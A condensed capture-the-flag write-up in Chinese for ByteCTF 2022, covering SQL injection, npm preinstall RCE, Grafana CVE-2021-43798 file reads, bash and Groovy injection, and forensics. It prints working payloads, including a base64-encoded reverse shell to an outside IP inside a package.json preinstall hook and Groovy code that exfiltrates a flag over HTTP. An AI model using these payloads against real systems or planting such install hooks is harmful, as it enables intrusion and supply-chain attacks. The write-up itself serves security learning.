---
title: 2022 ByteCTF By EDISEC
contest: ByteCTF 2022
year: 2022
difficulty: medium
vuln_type: [sqli, rce, ssrf, lfi, web_unknown, xss, reverse, misc_unknown]
tags: [SQLi-users-signup, npm-preinstall, package.json, dependencies, Grafana-CVE-2021-43798, secure-decrypt, Groovy, sysdig, findit.txt, Android-Droid, XSS, setResult]
attack_chain: ["Q1 ctf_cloud: SQLi 注册 username/password → 改 connect.sid 拿 admin", "POST /dashboard/upload package.json + preinstall bash reverse shell", "POST /dashboard/dependencies 触发 npm install preinstall → RCE", "Q2 easy_grafana: CVE-2021-43798 任意文件读 /etc/grafana/grafana.ini 拿 secret_key", "secure.decrypt 解密 admin 密码 → 登录拿 flag", "Q3 bash_game: arr[$(cat /flag)] bash 数组变量触发命令", "Q4 easy_groovy: def f = new File('/flag').text → URL('http://ip:1234/'+f).text 出网", "Q5 signin: /final 抓包爆破队伍名 + id", "Q6 find_it: sysdig 监控 Ubuntu → 找 findit.txt 找 PHP 异常上传", "Pwn Bronze Droid: Android setResult 函数 XSS 替换"]
key_payload: "preinstall = \"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash\""
one_liner: ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig
lesson: npm preinstall script 是供应链攻击面；CVE-2021-43798 Grafana 文件读是经典
quality: high
---

# 2022 ByteCTF By EDISEC

原文 https://www.ctfiot.com/59101.html

## Q1: ctf_cloud (SQLi + npm preinstall RCE)
**Step 1: SQLi 注册 admin**
```http
POST /users/signup
Content-Type: application/json
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
{"username":"bcasd","password":"su',1),('admin','su',1)--"}
```
- 多 X-Forwarded-* 头欺骗 IP
- 注入 username 拼 admin 账号

**Step 2: 上传 package.json**
```http
POST /dashboard/upload
Content-Type: multipart/form-data; boundary=...
------WebKitFormBoundary
Content-Disposition: form-data; name="c"; filename="package.json"
{"name": "userapp", "version": "0.0.1", "scripts": {"preinstall": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash"}}
```

**Step 3: 触发 npm install preinstall**
```http
POST /dashboard/dependencies
Content-Type: application/json
{"dependencies":{"su":"file:./public/uploads/"}}
```

## Q2: easy_grafana (CVE-2021-43798)
```http
GET /public/plugins/text/#/../../../../../../../../../..//etc/grafana/grafana.ini
GET /public/plugins/text/#/../../../../../../../../../..//var/lib/grafana/grafana.db
```
- 利用 Grafana 任意文件读 CVE-2021-43798
- https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
- 解密 admin 密码：
```python
from secure import decrypt
import base64
secret_key = 'SW2YcwTIb9zpO1hoPsMm'
ciphertext = 'b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/'
encrypted = base64.b64decode(ciphertext.encode())
pwdBytes, _ = decrypt(encrypted, secret_key)
print(pwdBytes)
```

## Q3: bash_game
```bash
arr[$(cat /flag)]
```
- bash 数组变量名触发命令执行
- `arr[$(cat /flag)]` 把命令结果当数组下标

## Q4: easy_groovy
```groovy
def f = new File("/flag").text
def res1 = new URL('http://ip:1234/1' + f).text
```
- Groovy 读文件 + URL 出网

## Q5: signin
- 抓包爆破 /final 队伍名 + id

## Q6: find_it
- sysdig 监控 Ubuntu
- 找 findit.txt 异常 PHP 上传
- https://www.howtoing.com/how-to-monitor-your-ubuntu-16-04-system-with-sysdig/

## Q7: Pwn Bronze Droid
- Android 逆向找 setResult 函数
- XSS 替换（同 BabyAndroid 模板）

## 教学价值
- **SQLi** 在用户注册时常见
- **npm preinstall/postinstall** 供应链 RCE
- **CVE-2021-43798** Grafana 8.x 通杀
- **bash 数组变量** 触发命令
- **Groovy new File** 文件读
- **sysdig** Linux 系统调用监控

## 工具
- Burp / curl
- npm
- Grafana 8.x
- Groovy 2.x
- sysdig
- pwntools
- Android Studio / jadx
